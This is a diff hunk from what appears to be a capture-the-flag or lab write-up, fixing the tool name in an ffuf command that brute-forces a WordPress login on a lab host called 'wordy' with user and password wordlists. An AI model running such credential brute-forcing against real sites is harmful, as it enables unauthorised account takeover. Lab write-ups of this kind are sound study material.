@@ -42,7 +42,7 @@ http://wordy/?author=2
 ![users-wordlist](https://github.com/adminush/Labs-Writeups/assets/58698274/d749b98e-a88d-4e36-b2f9-dc6f309bb7d5)
 
 ```
-fuff -u "http://wordy/wp-login.php" -X POST -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie: wordpress_test_cookie=WP+Cookie+check" -d "log=HFUZZ&pwd=WFUZZ&wp-submit=Log+In&redirect_to=http%3A%2F%2Fwordy%2Fwp-admin%2F&testcookie=1" -w users.txt:HFUZZ -w passwords.txt:WFUZZ --fw 188,184
+ffuf -u "http://wordy/wp-login.php" -X POST -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie: wordpress_test_cookie=WP+Cookie+check" -d "log=HFUZZ&pwd=WFUZZ&wp-submit=Log+In&redirect_to=http%3A%2F%2Fwordy%2Fwp-admin%2F&testcookie=1" -w users.txt:HFUZZ -w passwords.txt:WFUZZ --fw 188,184
 ```
 ![brute](https://github.com/adminush/Labs-Writeups/assets/58698274/cff01e0a-3f39-45b7-a5c1-df767f4d1017)
 
